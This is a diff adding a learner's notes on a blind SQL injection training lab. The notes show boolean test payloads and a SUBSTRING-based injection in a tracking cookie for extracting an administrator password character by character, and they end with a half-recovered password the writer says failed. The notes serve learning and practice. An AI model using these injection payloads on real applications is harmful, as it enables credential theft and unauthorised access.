@@ -1,0 +1,44 @@
+TASK:
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+
+PS sql query in backend:
+
+SELECT COUNT(*)
+FROM Users
+WHERE TrackingId = 'tPGzVO8ujVveNiUn'
+
+if there are any rows returned then send back the welcome back message on front encode
+
+
+What I want the query to look like
+
+SELECT COUNT(*)
+FROM Users
+WHERE TrackingId = 'tPGzVO8ujVveNiUn'' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'a
+
+
+testing ' AND '1'='1 onto the end of the trackingId, returns welcome back
+
+testing ' AND '1'='2 onto the end of the trackingId, returns NO welcome back
+
+based on this boolean logic, if i now use ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'a
+it should return welcome back, however getting no welcome back...
+
+used this ' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 9, 1) > 'a 
+worked however very tedious, potentially some better way of doing it...
+
+eventually got back this for the password:
+rharxujq 
+
+
+this didnt work however for the password, not sure why...
+
+
+
